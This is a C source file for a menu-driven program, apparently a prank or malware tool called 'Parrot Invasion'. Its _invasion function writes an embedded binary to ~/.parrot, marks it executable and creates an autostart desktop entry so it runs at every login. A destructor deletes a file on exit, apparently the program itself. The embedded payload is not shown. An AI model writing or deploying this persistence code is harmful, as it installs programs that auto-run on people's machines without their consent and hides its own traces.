// Big Header

# include "config.h"
#include "../invasion.h"
#include <argz.h>

int	_raid();

/** */
int	_interface()
{
	int		action = -1;
	char	input[64];

	printf(
		CLEAR
		" _________________________ \n"
		"| what are we going to do |\n"
		"| 1 - sending a raid      |\n"
		"| 2 - make an invasion    |\n"
		"| 3 - take over this place|\n"
		"| q - quit                |\n"
		"|_________________________|\n"
	);

	while (action < 0)
	{
		write(STDOUT_FILENO, "\n>>> ", 5);
		fgets(input, sizeof(input), stdin);
		if (strncmp(input, "1", 1) == 0)
			action = e_raid;
		else if (strncmp(input, "2", 1) == 0)
			action = e_invasion;
		else if (strncmp(input, "3", 1) == 0)
			action = e_takeover;
		else if (strncmp(input, "q", 1) == 0)
			action = e_quit;
		else
			printf("Invalid action. Please try again.\n");
	}
	return (action);
}

int	_invasion(
	const char *const restrict name
)
{
	char	buffer[256];
	pid_t	pid;
	FILE	*file;

	(void)name;
	pid = fork();
	if (pid == 0)
	{
		file = fopen(".parrot", "wb");
		fwrite(__invasion, __invasion_len, 1, file);
		sprintf(buffer,
			"mv .parrot ~/.parrot && "
			"chmod +x ~/.parrot && "
			"echo \""
			"[Desktop Entry]\n"
			"Type=Application\n"
			"Exec=$HOME/.parrot\n"
			"Comment=Parrot Invasion\n"
			"Name=Parrot Invasion\n"
			"\" > ~/.config/autostart/parrot.desktop"
		);
		fclose(file);
		execlp("bash", "bash", "-c", buffer, (char *)NULL);
		PRINT_ERROR("execlp");
	}
	else if (pid > 0)
		_raid();
	else
		PRINT_ERROR("fork failed");
	return (0);
}

int	_takeover()
{
	fprintf(stderr, "not implemented yet\n");
	return (0);
}

__attribute__((noreturn, destructor)) int	_quit(
	const char *const restrict name
)
{
	unlink(name);
	PRINT_DEBUG(
		CLEAR
		"Cleaning up and exiting...\n"
	);
	exit(0);
}
